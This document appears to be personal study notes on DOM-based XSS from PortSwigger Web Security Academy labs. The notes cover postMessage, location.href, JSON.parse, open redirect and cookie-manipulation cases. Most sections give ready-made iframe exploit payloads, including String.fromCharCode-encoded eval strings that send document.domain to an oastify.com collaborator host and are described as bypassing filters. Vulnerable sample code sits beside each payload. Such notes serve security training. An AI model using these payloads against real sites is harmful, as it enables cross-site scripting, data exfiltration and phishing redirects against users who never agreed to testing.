![[DOM-Based.png]]
# Recon

DOM XSS happens when client-side JavaScript takes user-controllable input and includes it into a dangerous function. Use the DevTools and go to the Sources/Debugger tab. In every page, you can search for the keyword "script" and also search through all JavaScript pages.

In these files/pages, you can search for any user-controllable sources and dangerous sinks that the JavaScript is using. Analyse if JavaScript is taking any sources and including them into dangerous sinks. Search all static JavaScript files too.
# Source - Web Messages

Use web messages as a source to send malicious data to a target window that will take in that and include it in a dangerous sink. As an example:

```html
window.postMessage("<img src=x onerror=alert(1)>")
```

And the payload may be:

```html
<iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

The vulnerable code may be:

```html
<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>
```

For exploitation payloads, you can use document.location to exfiltrate data and encode the payload to bypass filters. The below payload can be used to test in the DevTools console. The "String.fromCharCode" contains the following:

- `document.location = "https://m651thgj.oastify.com/?x=" + document.domain + "END"`

```html
postMessage('<img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,109,104,55,121,106,109,105,97,55,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))>')
```

The final payload for the exploit server:

```html
<iframe src="https://0a41005003b5365e82996bf000200091.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,109,104,55,121,106,109,105,97,55,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))>','*')">
```
# Source - Web Messages location.href()

Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink. As an example, the code will place the user-controllable input into the location.href sink if the message contains the string "http:"/

An example payload to test in DevTools:

```javascript
window.postMessage(“javascript:alert(1)//http:”)
```

And the final payload:

```html
<iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

The vulnerable code is as follows:

```html
<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>
```

For exploitation payloads, you can use document.location to exfiltrate data and encode the payload to bypass filters. The below payload can be used to test in the DevTools console. The pseudo javascript protocol is used here as the data is inserted in href.

```javascript
postMessage('javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,102,52,107,51,49,118,108,99,57,103,120,53,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:')
```

The final payload:

```html
<iframe src="https://0ac6000c045b941d800f44e400e9009d.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,98,114,54,122,119,122,110,110,99,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:','*')">
```
# Source - Web Messages JSON.parse()

There is a client-side script on the app that has an event listener that is listening for a web message. It is possible to submit crafted input which will be included in the "src" attribute of an \<iframe>. This is essentially the location.href sink. You can use a JavaScript pseudo-protocol payload here - \javascript:print().

```html
<iframe src=https://VULNERABLE-APPLICATION.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

The vulnerable code:

```html
<script>
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
</script>
```

The exploitation payload:

```html
<iframe src=https://0ab400b604252be5803512fc002b00ad.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,112,99,53,100,118,116,109,104,100,97,49,122,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))\"}","*")'>
```
# DOM XSS - Open Redirection

There was a client-side script on the app that is taking in a query parameter called "url" and using the value in a location.href sink. The URL needs to begin with "https://". The JavaScript pseudo-protocol will not work here because you do not have control of the beginning of the href value. This will simply redirect a user to a different website - can be used for phishing.

An example:

- `https://VULNERABLE-APP.net/post?postId=4&url=https://user-input`

The vulnerable code:

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>
```
# DOM XSS - Cookie Manipulation

The "window.location" source is being appended to a Cookie using the "document.cookie". This cookie value is reflected back in the app's response within an HTML attribute. Submit a crafted URL that will break out of the HTML context and execute JavaScript code.

An example context:

- `<a href='https://VULNERABLE-APP.net/product?productId=user-input`

And the payload would be:

```javascript
&'><script>print()</script>
```

>[!info]
>You need to use the & in the URL symbol to inject valid payload, since the app will throw an error if the "productId" is not valid.

The iframe will first load the vulnerable URL, which will store it in "window.location" source. Then, the onload event will redirect to another page on the app, which will trigger the JavaScript, as the URL is reflected in the response.

The final payload:

```html
<iframe src="https://VULNERABLE-APP.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://VULNERABLE-APP.net';window.x=1;">
```

The vulnerable code:

```html
<script>
   document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

And the exploitation payload:

```html
<iframe src="https://0ac0003e03b1155582af4721003c00da.web-security-academy.net/product?productId=1&'><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,100,101,118,49,98,116,104,49,100,112,50,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34))</script>" onload="if(!window.x)this.src='https://0ac0003e03b1155582af4721003c00da.web-security-academy.net';window.x=1;">
```

